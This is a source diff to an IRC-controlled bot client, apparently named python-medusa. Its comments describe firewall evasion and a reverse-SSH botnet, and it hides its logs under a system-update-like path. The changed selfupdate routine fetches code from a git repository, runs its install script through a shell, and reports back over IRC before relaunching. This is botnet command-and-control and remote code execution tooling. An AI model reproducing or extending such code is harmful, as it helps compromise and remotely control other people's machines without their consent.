@@ -30,7 +30,7 @@ from modules.logging import logfile, log
 #       openvpn     implement openvpn for firewall evasion
 #       reverse ssh ssh botnet implementation
 
-version = "5.8"                                                   # bot version
+version = "6.1.6"                                                   # bot version
 
 try:
     logfile(filename="/var/softupdated/bot_v%s.log" % version)                         # redirects bot output to logfile
@@ -422,12 +422,11 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
         privmsg('[>]    %s' % line)
     pid = os.getpid()
     privmsg('[>]   Running install.sh')
-    cmd = "sh /private/var/softupdated/code/*/install.sh %s" % pid
-    for line in run_shell(cmd):
-        log('[>]    ',line)
+    cmd = "cd /private/var/softupdated/code/*/; /bin/sh install.sh update &"
+    for line in run_shell(cmd, verbose=True):
         privmsg('[>]    %s' % line)
-        if line.find("Starting") != -1:
-            privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
+        if line.find("Finished") != -1:
+            privmsg("[+] Update Finished, relaunching. Log saved in update.log")
             quit_status = True
             irc.send ( 'QUIT\r\n' )
             raise SystemExit
@@ -435,7 +434,7 @@ def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):   # updates th
 
 ############ The beef of things
 if __name__ == '__main__':
-    if len(nick) > 15: nick = '[%s]' % (local_user[:13])          # if nick is over 15 characters, change to username truncated at 13 chars
+    if len(nick) > 15: nick = '[%s]' % (main_user[:13])          # if nick is over 15 characters, change to username truncated at 13 chars
     last_ping = time.time()                                       # last ping recieved
     threshold = 8 * 60                                            # maximum time between pings before assuming disconnected (in seconds)
     quit_status = False
